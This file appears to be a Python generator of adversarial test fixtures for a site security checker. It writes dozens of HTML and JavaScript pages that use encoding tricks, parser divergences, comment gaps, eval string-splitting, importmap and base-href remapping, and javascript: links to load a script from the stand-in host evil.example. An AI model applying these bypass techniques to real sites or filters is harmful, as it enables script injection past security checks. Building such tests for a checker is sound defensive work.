# Juno K2 adversarial fixtures for PR #31 at 822a668. Scratch only.
import os, sys, json, hashlib, shutil
B = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(B, '..', 'adv7'))
from mk7 import PIN, IDX, bare, sha, nest, TPL, MARK  # noqa
def room(name, files, shell=None):
    d = os.path.join(B, name); shutil.rmtree(d, ignore_errors=True); os.makedirs(d)
    files.setdefault('index.html', IDX)
    for p, c in files.items():
        fp = os.path.join(d, p); os.makedirs(os.path.dirname(fp) or d, exist_ok=True)
        open(fp, 'wb').write(c.encode() if isinstance(c, str) else c)
    sh = {'base': 'v1.2.6', 'fork': False}; sh.update(shell or {})
    json.dump({'siteId': name, 'shell': sh}, open(os.path.join(d, 'site.json'), 'w'))
EVU = 'https://evil.example/x.js'
EV = '<script src="%s"></script>' % EVU
R = {'redirects': ['go.html']}
NS = lambda *p: {'noShell': list(p)}
NSD = lambda *p, t=None: {'noShell': list(p), 'overrides': {'inline': [{'page': p[0], 'sha256': sha(x), 'reason': 'r'} for x in ([NF] + ([t] if t else []))]}}
NF = ("\n    (function () {\n      var path = location.pathname || '/';\n      if (path.charAt(0) !== '/') path = '/' + path;\n"
      "      try { sessionStorage.setItem('subx.restorePath', path + (location.search || '') + (location.hash || '')); } catch (e) {}\n"
      "      location.replace('/' + (location.search || '') + (location.hash || ''));\n    })();\n  ")
def nf(extra_head='', extra_body='', tpl=NF):
    return '<!DOCTYPE html>\n<html><head><meta charset="utf-8">%s<script>%s</script></head><body>%s</body></html>\n' % (extra_head, tpl, extra_body)
# ---------- A. encoding: browsers decode by BOM (overrides HTTP charset); checker reads utf-8/replace
u16 = lambda s, enc: (b'\xff\xfe' if enc == 'le' else b'\xfe\xff') + s.encode('utf-16-' + enc)
room('a0_utf16le_promo', {'promo.html': u16('<!DOCTYPE html><html><body>%s</body></html>' % EV, 'le')})
room('a1_utf16be_promo', {'promo.html': u16('<!DOCTYPE html><html><body>%s</body></html>' % EV, 'be')})
room('a2_utf16le_noshell', {'404.html': u16(nf(extra_body=EV), 'le')}, NS('404.html'))
room('a3_utf8bom_index_ok', {'index.html': b'\xef\xbb\xbf' + IDX.encode()})                  # control: should be OK
room('a4_utf16le_index_pinned', {'index.html': u16('<html><head>%s%s</head></html>' % (PIN, EV), 'le')})
# ---------- B. extensions outside PAGE_EXTS that browsers render as (X)HTML
XH = '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body><script src="%s"/></body></html>' % EVU
room('b0_xml_page', {'promo.xml': XH})
room('b1_xht_page', {'promo.xht': XH})
room('b2_mhtml_like_htm_upper', {'promo.HTML': '<html><body>%s</body></html>' % EV})
# ---------- C. pin killers: checker thinks pin runs, browser does not (F1 kill-switch evasion)
PINB = PIN.replace('<script ', '<script %s ')
def pinpage(pre='', attrs=None, post=''):
    p = PINB % attrs if attrs else PIN
    return '<html><head>%s%s%s</head><body></body></html>' % (pre, p, post)
room('c0_pin_for_event', {'index.html': pinpage(attrs='for="document" event="onclick"')})
room('c1_pin_language_vbscript', {'index.html': pinpage(attrs='language="vbscript"')})
room('c2_pin_in_selfclosed_noscript', {'index.html': pinpage('<noscript/>', post='</noscript>')})
room('c3_pin_in_selfclosed_template', {'index.html': pinpage('<template/>', post='</template>')})
room('c4_pin_in_selfclosed_textarea', {'index.html': '<html><body><textarea/>%s</textarea></body></html>' % PIN})
room('c5_pin_in_selfclosed_title', {'index.html': '<html><head><title/>%s</title></head></html>' % PIN})
room('c6_pin_in_selfclosed_iframe', {'index.html': '<html><body><iframe/>%s</iframe></body></html>' % PIN})
room('c7_pin_after_frameset', {'index.html': '<html><head></head><frameset></frameset>%s</html>' % PIN})
room('c8_pin_language_js_ok', {'index.html': pinpage(attrs='language="javascript"')})  # runs in browsers: should be OK
# ---------- D. tokenizer / grammar divergence
room('d0_nul_in_tagname', {'promo.html': '<html><body><script\0 src="%s"></script></body></html>' % EVU})
room('d1_cr_only_stub', {'go.html': nest('go').replace('\n', '\r')}, R)
room('d2_script_slash_attr', {'promo.html': '<html><body><script/src="%s"></script></body></html>' % EVU})
room('d3_dup_src', {'promo.html': '<html><body><script src="/ok.js" src="%s"></script></body></html>' % EVU})
room('d4_upper_SCRIPT', {'promo.html': '<HTML><BODY><SCRIPT SRC="%s"></SCRIPT></BODY></HTML>' % EVU})
room('d5_unquoted_quote', {'promo.html': '<html><body><script src=%s?a"b></script></body></html>' % EVU})
room('d6_nested_template', {'promo.html': '<html><body><template><template></template>%s</template></body></html>' % EV})
room('d7_unclosed_script_eof', {'promo.html': '<html><body><script>import("%s")' % EVU})
room('d8_unclosed_comment_eof', {'promo.html': '<html><body><!-- %s' % EV})
room('d9_plaintext', {'promo.html': '<html><body><plaintext>%s' % EV})
room('d10_vt_in_tag', {'promo.html': '<html><body><script\x0bsrc="%s"></script></body></html>' % EVU})
room('d11_ff_in_tag', {'promo.html': '<html><body><script\x0csrc="%s"></script></body></html>' % EVU})
room('d12_noscript_breakout', {'promo.html': '<html><body><noscript><p title="</noscript>%s"></noscript></body></html>' % EV})
room('d13_select_ctx', {'promo.html': '<html><body><select><script src="%s"></script></select></body></html>' % EVU})
room('d14_svg_p_breakout', {'promo.html': '<html><body><svg><p>%s</p></svg></body></html>' % EV})
room('d15_dsd_inline_ns', {'terms.html': '<html><body><div><template shadowrootmode="open"><script>fetch("%s")</script></template></div></body></html>' % EVU}, NS('terms.html'))
room('d16_math_mtext_script_ns', {'terms.html': '<html><body><math><mtext><script>alert(1)</script></mtext></math></body></html>'}, NS('terms.html'))
# ---------- E. JS comment / whitespace gaps (pinned index, declared inline module; keep files)
def mod_inline(name, code, shell_extra=None, page='index.html', noshell=False, files=None):
    pg = '<html><head>%s<script type="module">%s</script></head></html>' % ('' if noshell else PIN, code)
    f = {page: pg}; f.update(files or {})
    sh = {'overrides': {'inline': [{'page': page, 'sha256': sha(code), 'reason': 'r'}]}}
    if noshell: sh['noShell'] = [page]
    sh.update(shell_extra or {}); room(name, f, sh)
mod_inline('e0_ls_ends_line_comment', "import//x\u2028'%s';" % EVU)
mod_inline('e1_cr_ends_line_comment', "import//x\r'%s';" % EVU)
mod_inline('e2_ps_ends_line_comment', "import//x\u2029'%s';" % EVU)
mod_inline('e3_bom_ws_after_import', "import\ufeff'%s';" % EVU)
mod_inline('e4_bom_ws_before_import', "var a=1;\ufeffimport'%s';" % EVU)
mod_inline('e5_nbsp_before_import', "var a=1;\u00a0import'%s';" % EVU)
mod_inline('e6_ls_dynamic', "import//x\u2028('%s');" % EVU)
mod_inline('e7_noshell_ls', "import//x\u2028'%s';" % EVU, page='terms.html', noshell=True)
mod_inline('e8_noshell_bom', "import\ufeff'%s';" % EVU, page='terms.html', noshell=True)
mod_inline('e9_noshell_bom_dyn', "import\ufeff('%s');" % EVU, page='terms.html', noshell=True)
mod_inline('e10_str_with_comment', "var a='/*';import '%s';var b='*/';" % EVU)
mod_inline('e11_tpl_literal', "var a=`${import('%s')}`;" % EVU)
mod_inline('e12_hashbang', "#!x\nimport '%s';" % EVU)
mod_inline('e13_regex_slashes', "var r=/\\/\\//;import '%s';" % EVU)
mod_inline('e14_export_from_bom', "export\ufeff*from'%s';" % EVU)
def keep(name, body, extra=None, noshell=False):
    k = {'file': 'app.js', 'sha256': sha(body), 'reason': 'r'}; k.update(extra or {})
    page = 'terms.html' if noshell else 'index.html'
    pg = '<html><head>%s<script src="app.js"></script></head></html>' % ('' if noshell else PIN)
    sh = {'keep': [k]}
    if noshell: sh['noShell'] = [page]
    room(name, {page: pg, 'app.js': body}, sh)
keep('e15_keep_htmlcomment_gap', b"import<!--x\n('https://evil.example/x.js');\n")
keep('e16_keep_arrow_comment_gap', b"import\n--> x\n('https://evil.example/x.js');\n")
keep('e17_keep_ls_gap', "import//x\u2028('https://evil.example/x.js');\n".encode())
keep('e18_keep_bom_gap', "import\ufeff('https://evil.example/x.js');\n".encode())
keep('e19_keep_ns_bom_gap', "import\ufeff('https://evil.example/x.js');\n".encode(), noshell=True)
keep('e20_keep_ns_htmlcomment', b"import<!--x\n('https://evil.example/x.js');\n", noshell=True)
keep('e21_keep_ns_eval', b"eval('imp'+'ort(\"https://evil.example/x.js\")');\n", noshell=True)
keep('e22_keep_ns_function', b"Function('return imp'+'ort(\"https://evil.example/x.js\")')();\n", noshell=True)
# ---------- F. importmap / base / byte-for-byte allowances
IM = '{"imports":{"/m.js":"%s"}}' % EVU
mod = "import '/m.js';"
room('f0_importmap_remap', {'index.html': '<html><head><script type="importmap">%s</script>%s<script type="module">%s</script></head></html>' % (IM, PIN, mod),
     'm.js': b'export{}\n'}, {'overrides': {'inline': [{'page': 'index.html', 'sha256': sha(IM), 'reason': 'r'}, {'page': 'index.html', 'sha256': sha(mod), 'reason': 'r'}],
     'modules': [{'file': 'm.js', 'sha256': sha(b'export{}\n'), 'reason': 'r'}]}})
room('f1_base_noshell_keep', {'terms.html': '<html><head><base href="https://evil.example/"><script src="app.js"></script></head></html>', 'app.js': b'1;\n'},
     {'noShell': ['terms.html'], 'keep': [{'file': 'app.js', 'sha256': sha(b'1;\n'), 'reason': 'r'}]})
room('f2_base_after_noshell', {'terms.html': '<html><head><script src="app.js"></script></head><body><base href="https://evil.example/"></body></html>', 'app.js': b'1;\n'},
     {'noShell': ['terms.html'], 'keep': [{'file': 'app.js', 'sha256': sha(b'1;\n'), 'reason': 'r'}]})
room('f3_404_ok', {'404.html': nf()}, NSD('404.html'))                                                       # control OK
room('f4_404_crlf_ok', {'404.html': nf().replace('\n', '\r\n')}, NSD('404.html'))                            # control OK
room('f5_404_cr_only', {'404.html': nf().replace('\n', '\r')}, NSD('404.html'))
room('f6_404_appended_evil', {'404.html': nf(extra_body=EV)}, NSD('404.html'))
room('f7_404_appended_img', {'404.html': nf(extra_body='<img src=x onerror="import(\'%s\')">' % EVU)}, NSD('404.html'))
room('f8_404_second_template', {'404.html': nf(extra_body='<script>%s</script>' % NF)}, NSD('404.html'))    # benign dup: OK fine
room('f9_404_tpl_trailing_code', {'404.html': nf(tpl=NF + "import('%s');" % EVU)}, NSD('404.html', t=NF + "import('%s');" % EVU))
room('f10_404_tpl_ws_variant', {'404.html': nf(tpl=NF.replace('    (function', '\t(function'))}, NSD('404.html', t=NF.replace('    (function', '\t(function')))
room('f11_404_bom_before', {'404.html': b'\xef\xbb\xbf' + nf().encode()}, NSD('404.html'))
room('f12_404_tpl_nbsp', {'404.html': nf(tpl=NF.replace('var path', 'var\u00a0path'))}, NSD('404.html', t=NF.replace('var path', 'var\u00a0path')))
room('f13_marker_space_variant', {'go.html': nest('go').replace('<!-- subx', '<!--  subx')}, R)
room('f14_marker_dup_plus_hidden', {'go.html': nest('go').replace(MARK, MARK + MARK)}, R)  # benign dup
room('f15_svg_animate_js_ns', {'terms.html': '<html><body><svg><a><animate attributeName="href" values="javascript:alert(1)"/><text y="20">x</text></a></svg></body></html>'}, NS('terms.html'))
room('f16_href_tab_js_ns', {'terms.html': '<html><body><a href="java&#x09;script:alert(1)">x</a></body></html>'}, NS('terms.html'))
room('f17_href_leading_space_js_ns', {'terms.html': '<html><body><a href=" &#1;javascript:alert(1)">x</a></body></html>'}, NS('terms.html'))
room('f18_svg_set_ns', {'terms.html': '<html><body><svg><a><set attributeName="href" to="javascript:alert(1)"/><text y="20">x</text></a></svg></body></html>'}, NS('terms.html'))
room('f19_jscript_type_ns', {'terms.html': '<html><body><script type="text/jscript">alert(1)</script></body></html>'}, NS('terms.html'))
room('f20_xjs_type_pinned', {'index.html': '<html><head>%s<script type="application/x-javascript">import("%s")</script></head></html>' % (PIN, EVU)})
room('f21_speculation_ns', {'terms.html': '<html><head><script type="speculationrules">{"prerender":[{"urls":["https://evil.example/"]}]}</script></head></html>'}, NS('terms.html'))
print('ok')
